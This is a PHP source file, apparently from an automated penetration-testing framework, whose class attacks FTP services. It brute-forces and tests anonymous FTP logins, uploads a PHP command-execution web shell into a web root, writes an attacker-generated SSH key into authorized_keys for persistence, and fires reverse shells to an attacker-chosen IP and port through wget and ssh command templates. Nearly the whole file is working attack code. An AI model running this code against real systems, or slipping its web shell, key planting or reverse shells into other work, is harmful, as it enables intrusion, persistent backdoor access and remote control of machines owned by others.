<?php


class service2ftp extends service2exploitdb {


    public function __construct($eth,$domain,$ip,$port,$service_protocol) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol);
    }

    // https://www.jpsecnetworks.com/week-8-oscp-preparation-post-exploitation/
    // https://codemonkeyism.co.uk/post-exploitation-file-transfers/
    // http://devloop.users.sourceforge.net/index.php?article151/solution-du-ctf-c0m80-1-de-vulnhub
    
    public function service2ftp4exec(){
        $result = "";

        $this->titre(__FUNCTION__);
        
        

       $result .= $this->ftp4auth();                
            
            $users_passwd = $this->ip2users4passwd();
            foreach ($users_passwd as $user2name => $user2pass){
                if (!empty($user2name)){
                    $check = $this->auth2login_ftp4exec($user2name, $user2pass, "help");
                    $this->ftp2pentest($user2name, $user2pass);
                    
                }
            }
            

            $this->service2exploitdb4exec();
            return $result;
        
    }
 
    
    public function ftp2upload($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        
        $http_ports = $this->ip2ports4service("http");
        foreach ($http_ports as $http_open)
        if(!empty($http_open)) {
            $tab_dir = $this->ftp2dir($ftp_stream);
            foreach ($tab_dir as $dir){
                if (strstr($dir, "/var/www/html")!==FALSE){
                    $this->log2succes("Found WebServer repository ");
                    
                    $this->requette("echo '<?php system(\\\$_REQUEST[\"cmd\"]);?>' > /tmp/system_request.php " );
                    ftp_put($ftp_stream, "/tmp/system_request.php", "$dir/system_request.php", FTP_ASCII);
                    $template_shell = "wget --user-agent='$this->user2agent' \"http://$this->ip:$http_open/system_request.php?cmd=%SHELL%\" --tries=2 --no-check-certificate -qO- 2> /dev/null   ";
                    $templateB64_shell = base64_encode($template_shell);
                    $attacker_ip = $this->ip4addr4target($this->ip);
                    $attacker_port = rand(1024,65535);
                    $shell = "/bin/bash";
                    $cmd_rev  = $this->url2encode($this->rev8sh($attacker_ip, $attacker_port, $shell));
                    $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
                    
                    $lprotocol = 'T' ;
                    $type = "server";
                    $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                }
            }
            
        }
        
        
    }
    

    public function ftp2cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $this->stream2info($ftp_stream);
        $this->pause();
        
        $command = "! /bin/bash -c id";
        echo $this->chaine(ftp_raw($ftp_stream, $command));
        $this->pause();
        
        $template_shell = "wget --ftp-user='$remote_username_ftp' --ftp-password='$remote_userpass_ftp' \"ftp://$this->ip:$this->port/\"  --execute '%SHELL%' --tries=2 --no-check-certificate -qO- 2> /dev/null   ";
        $templateB64_shell = base64_encode($template_shell);
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        $shell = "/bin/bash";
        $cmd_rev  = $this->url2encode($this->rev8sh($attacker_ip, $attacker_port, $shell));
        $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
        
        $lprotocol = 'T' ;
        $type = "server";
        //$this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
        
    }
    
    
    public function ftp2shell($ftp_stream,$remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $this->ftp2cmd($ftp_stream,$remote_username_ftp, $remote_userpass_ftp);$this->pause();
        $this->ftp2keys($ftp_stream,$remote_username_ftp, $remote_userpass_ftp);$this->pause();
        $this->ftp2upload($ftp_stream);$this->pause();
        
    }
    
    public function ftp4auth(){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        
        
        $user2name = "user_doesnt_exist";
        $user2pass = "pass_doesnt_exist" ;
        $query_medusa = "medusa -u \"$user2name\" -p \"$user2pass\" -h '$this->ip' -M ftp -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
        if (!empty($this->req_ret_str($query_medusa))) {
            $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "help");
            $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
            $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "ls -al");
            return $result;
        }
        
        $this->pause();
        
        $user2name = "anonymous";
        $user2pass = "" ;
        $query_medusa = "medusa -u \"$user2name\" -p \"$user2pass\" -h '$this->ip' -M ftp -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
        if (!empty($this->req_ret_str($query_medusa))) {
            $this->port2auth4pass4medusa("ftp",$user2name,$user2pass);
            $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "help");
            $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
            $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "ls -al");
            
        }
        
        
        
        $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ftp-brute.nse\" --script-args userdb=$this->dico_users $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
        $result .= $this->cmd("localhost",$query);
        //$result .= $this->auth2login4nmap($this->req_ret_str($query),"FTP nmap Brute");
        //$xml = file_get_contents("$this->dir_tmp/nmap.ftp.xml");$result .= $this->auth2login4nmap($xml,"FTP nmap Brute");
        
        $this->pause();
        
        
        $tab_users_shell = $this->ip2users();
        if(!empty($tab_users_shell))
            foreach ($tab_users_shell as $user2name_shell){
                $result .= $this->article("USER FOUND FOR TEST", "$user2name_shell");
                $result .= $this->port2auth4dico4medusa("ftp",$user2name_shell);
        }
        return $result;
    }
    
    
    public function ftp2keys($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $result = "";

        $ssh_ports = $this->ip2ports4service("ssh");
        foreach ($ssh_ports as $ssh_open)
        if(!empty($ssh_open)) {
        $remote_authorized_keys_filepath = "";
        $public_authorized_keys_str2use = "";
        //$remote_username_ftp  $remote_userpass_ftp, $remote_username2use, $racine_ftp
        
        $tab_dir = $this->ftp2dir($ftp_stream);
        $str_dir = $this->tab($tab_dir);
        $this->pause();
        $this->ssTitre("Searching authorized_keys");
        $tab_files = $this->ftp2files($ftp_stream);
        $str_files = $this->tab($tab_files);
        
        $this->pause();
        $remote_authorized_keys_filepath = $this->ftp2search4path($tab_files, "authorized_keys");
        $this->article("PATH authorized_keys", $remote_authorized_keys_filepath);
        $this->pause();
        
        $racine_ftp = ftp_pwd($ftp_stream);
        
        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username_ftp.rsa.priv";
        $obj_file = new FILE($private_key_ssh_rsa_file);
        $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        $private_key_passwd = '';
        $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
        $public_authorized_keys_str2use = $this->key2gen4public("",10, $private_key_ssh_rsa_file, $public_key_ssh_rsa_file, $private_key_passwd);
        
        $this->pause();
        
        if (empty($remote_authorized_keys_filepath)){
            
            ftp_mkdir($ftp_stream, "$racine_ftp.ssh");

            $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        echo $this->tab($ftp_rawlist_racine);
        
        $tmp = ftp_rawlist($ftp_stream, "$racine_ftp",TRUE);
            if (!$tmp) echo $tmp ;
            
            $query = "cat $public_key_ssh_rsa_file > /tmp/authorized_keys";
            $this->requette($query);
            ftp_put($ftp_stream, "$racine_ftp.ssh/authorized_keys", "/tmp/authorized_keys", FTP_ASCII);
            
            
            var_dump(ftp_rawlist($ftp_stream, "$racine_ftp.ssh/",TRUE));
            if (!$tmp) echo $tmp ;

            ftp_chdir($ftp_stream,"$racine_ftp.ssh/");
            $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
            $files_list_str = $this->tab($ftp_rawlist_racine);
            echo $files_list_str;
            
            if (strstr($files_list_str, "authorized_keys")!==FALSE) $remote_authorized_keys_filepath = "$racine_ftp/.ssh/authorized_keys";

            $this->pause();
            
            ftp_chdir($ftp_stream,"$racine_ftp");
        }
        
        if (!empty($remote_authorized_keys_filepath)){
            $this->article("FTP GET", $remote_authorized_keys_filepath);
            ftp_get($ftp_stream, "/tmp/authorized_keys_get",$remote_authorized_keys_filepath, FTP_ASCII);
            
            $query = "cat /tmp/authorized_keys_get";
            $public_keys_found = trim($this->req_ret_str($query));
            $this->pause();
            
            
            if(stristr($public_authorized_keys_str2use,$public_keys_found)!==FALSE) {
                $this->log2succes("FOUND Public key - already exist");
                echo "Public key already exist\n";
                $result .= "Public key already exist\n";
            }
            else {
                $chaine = "Public key added\n";
                $this->note($chaine);
                $query = " echo '$public_keys_found' | tee -a /tmp/authorized_keys_get";
                $this->req_ret_str($query);
                
            }
            $this->pause();
            
            // ftp_site($conn, 'CHMOD 0600 /home/user/privatefile')
            

                $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $remote_username_ftp, $private_key_ssh_rsa_file,$private_key_passwd);
                if(is_resource($stream)){
                    $info = "SSH Private Key:$private_key_ssh_rsa_file";
                    $this->log2succes($info);
                    $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $remote_username_ftp@$this->ip -p $ssh_open -C  \"%SHELL%\" ";
                    $templateB64_shell = base64_encode($template_shell);
                    $attacker_ip = $this->ip4addr4target($this->ip);
                    $attacker_port = rand(1024,65535);
                    $shell = "/bin/bash";
                    $cmd_rev  = $this->rev8sh($attacker_ip, $attacker_port, $shell);
                    $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);

                    $lprotocol = 'T' ;
                    $type = "server";
                    $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                }
            

            
        }
        $this->pause();
    }
        else {
            $chaine = "No SSH Service On This Host";
            $this->log2error($chaine);
        }
        
        return $result;
    }
    
    public function ftp2search4path($tab_path,$search){        
        $search = trim($search);
        $this->ssTitre("Searching $search");
        $file_path = "";
        foreach ($tab_path as $file){
            $file = trim($file);
            if (!empty($file)){
                if (strstr($file,$search)!==FALSE)  {
                    $file_path = $file;
                    return $file_path;
                }
            }
        }
        return $file_path;
    }

    
    
    
    public function ftp2pentest( $remote_username_ftp, $remote_userpass_ftp){
        $this->titre(__FUNCTION__); 
        $result = "";

         
        $ftp_stream = @ftp_connect($this->ip,$this->port) ;

        
        if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp)){
            echo ftp_systype($ftp_stream);
            
            $result .= $this->ftp2shell($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
            $this->pause();
            
            echo $result;
        }
        ftp_close($ftp_stream);
        return $result;
    }
    
    public function ftp2files($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        $tab_files_path = array();

        

        $base = ftp_pwd($ftp_stream);
        $this->article("PWD FTP", $base);
       
        $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        //var_dump($ftp_rawlist_racine);
        foreach ($ftp_rawlist_racine as $v) {
            $info = array();
            $vinfo = preg_split("/[\s]+/", $v, 9);
            if ($vinfo[0] !== "total") {
                $info['chmod'] = $vinfo[0];
                $info['num'] = $vinfo[1];
                $info['owner'] = $vinfo[2];
                $info['group'] = $vinfo[3];
                $info['size'] = $vinfo[4];
                $info['month'] = $vinfo[5];
                $info['day'] = $vinfo[6];
                $info['time'] = $vinfo[7];
                $info['name'] = $vinfo[8];
                $info['path'] = "$base/".$vinfo[8];
                $rawlist[$info['name']] = $info;
            }
        }
        $dir = array();
        $file = array();
        foreach ($rawlist as $k => $v) {
            if ($v['chmod']{0} == "d") {
                $dir[$k] = $v;
            } elseif ($v['chmod']{0} == "-") {
                $file[$k] = $v;
            }
        }
        
        foreach ($dir as $dirname => $dirinfo) {
            echo "[ $dirname ] " . $dirinfo['chmod'] . " | " . $dirinfo['owner'] . " | " . $dirinfo['group'] . " | " . $dirinfo['month'] . " " . $dirinfo['day'] . " " . $dirinfo['time'] . "\n";
            if ($dirname!=="." && $dirname!==".." ){
                ftp_chdir($ftp_stream, $dirname);
                $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
            echo $this->tab($ftp_rawlist_dir);
            foreach ($ftp_rawlist_dir as $v) {
                $info = array();
                $vinfo = preg_split("/[\s]+/", $v, 9);
                if ($vinfo[0] !== "total") {
                    $info['chmod'] = $vinfo[0];
                    $info['num'] = $vinfo[1];
                    $info['owner'] = $vinfo[2];
                    $info['group'] = $vinfo[3];
                    $info['size'] = $vinfo[4];
                    $info['month'] = $vinfo[5];
                    $info['day'] = $vinfo[6];
                    $info['time'] = $vinfo[7];
                    $info['name'] = $vinfo[8];
                    $info['path'] = "$base/$dirname/".$vinfo[8];
                    $rawlist[$info['name']] = $info;
                }
            }
            
            //var_dump($rawlist);
            foreach ($rawlist as $k => $v) {
                if ($v['chmod']{0} == "-") {
                    $file[$k] = $v;
                }
            }
            
            ftp_chdir($ftp_stream, $base);
            }
        }

        foreach ($file as $filename => $fileinfo) {
            //echo "$filename " . $fileinfo['chmod'] . " | " . $fileinfo['owner'] . " | " . $fileinfo['group'] . " | " . $fileinfo['size'] . " Byte | " . $fileinfo['month'] . " " . $fileinfo['day'] . " " . $fileinfo['time'] . "\n";
            $this->article($fileinfo['path'], $fileinfo['size']." Byte ");
            $tab_files_path[] = $fileinfo['path'];
        }
        
        
        

        
    
        return $tab_files_path;

    }
    

    
    
    public function ftp2dir($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        

        $tab_dir_path = array();
        

        $base = ftp_pwd($ftp_stream);
        $this->article("PWD FTP", $base);
        
        $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        //var_dump($ftp_rawlist_racine);
        foreach ($ftp_rawlist_racine as $v) {
            $info = array();
            $vinfo = preg_split("/[\s]+/", $v, 9);
            if ($vinfo[0] !== "total") {
                $info['chmod'] = $vinfo[0];
                $info['num'] = $vinfo[1];
                $info['owner'] = $vinfo[2];
                $info['group'] = $vinfo[3];
                $info['size'] = $vinfo[4];
                $info['month'] = $vinfo[5];
                $info['day'] = $vinfo[6];
                $info['time'] = $vinfo[7];
                $info['name'] = $vinfo[8];
                $info['path'] = $base.$vinfo[8];
                $rawlist[$info['name']] = $info;
            }
        }
        $dir = array();

        foreach ($rawlist as $k => $v) {
            if ($v['chmod']{0} == "d") {
                $dir[$k] = $v;
            } 
        }
        
        foreach ($dir as $dirname => $dirinfo) {
            echo "[ $dirname ] " . $dirinfo['chmod'] . " | " . $dirinfo['owner'] . " | " . $dirinfo['group'] . " | " . $dirinfo['month'] . " " . $dirinfo['day'] . " " . $dirinfo['time'] . "\n";
            if ($dirname!=="." && $dirname!==".." && !empty($dirname) ){
                $tab_dir_path[] = $dirname;
                $this->article("dir test", $dirname);
                ftp_chdir($ftp_stream,  "$base$dirname");
                $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
                echo $this->tab($ftp_rawlist_dir);
                foreach ($ftp_rawlist_dir as $v) {
                    $info = array();
                    $vinfo = preg_split("/[\s]+/", $v, 9);
                    if ($vinfo[0] !== "total") {
                        $info['chmod'] = $vinfo[0];
                        $info['num'] = $vinfo[1];
                        $info['owner'] = $vinfo[2];
                        $info['group'] = $vinfo[3];
                        $info['size'] = $vinfo[4];
                        $info['month'] = $vinfo[5];
                        $info['day'] = $vinfo[6];
                        $info['time'] = $vinfo[7];
                        $info['name'] = $vinfo[8];
                        $info['path'] = "$base$dirname/".$vinfo[8];
                        $rawlist[$info['name']] = $info;
                    }
                }
                

            }
        }
        
      
        ftp_chdir($ftp_stream, $base);
        return $tab_dir_path;
        
    }
    
    
    
    
    
    
    
    
    
    
    
  }
?>
